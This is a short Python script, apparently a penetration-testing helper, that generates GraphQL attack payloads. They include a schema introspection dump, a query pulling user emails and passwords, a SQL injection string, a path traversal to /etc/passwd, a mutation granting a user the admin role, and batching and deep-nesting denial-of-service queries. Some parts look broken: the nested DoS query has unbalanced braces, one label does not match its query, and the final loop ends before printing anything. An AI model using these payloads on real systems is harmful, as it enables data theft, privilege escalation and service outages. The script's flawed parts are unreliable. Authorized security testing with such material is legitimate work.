def generate_introspection_query():
    return '''{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
      }
    }
    queryType { name }
    mutationType { name }
  }
}'''

def generate_injection_payloads():
    payloads = [
        {
            'name': 'Introspection (schema dump)',
            'query': generate_introspection_query()
        },
        {
            'name': 'Union-based data extraction',
            'query': '{ users { id name email password } }'
        },
        {
            'name': 'Nested query DoS (batching)',
            'query': '{' + ' '.join(f'q{i}:__typename' for i in range(1000)) + '}'
        },
        {
            'name': 'Alias-based enumeration',
            'query': '{ ' + ' '.join(f'u{i}: user(id: {i}) {{ name email }}' for i in range(1, 11)) + ' }'
        },
        {
            'name': 'SQL injection in argument',
            'query': '{ user(name: "admin\' OR 1=1--") { id name email } }'
        },
        {
            'name': 'Directory traversal in argument',
            'query': '{ file(path: "../../../etc/passwd") { content } }'
        },
        {
            'name': 'Mutation - unauthorized action',
            'query': 'mutation { updateUser(id: 1, role: "admin") { id role } }'
        },
        {
            'name': 'Deeply nested query (DoS)',
            'query': '{ a { b ' * 20 + '{ name }' + ' }' * 20 + ' }'
        },
    ]
    return payloads

print('GraphQL Injection Tester')
print('='*60)

print('\nPayloads:')
for p in generate_injection_payloads():
    query_preview = p['query'][:100].replace('\n', ' ')
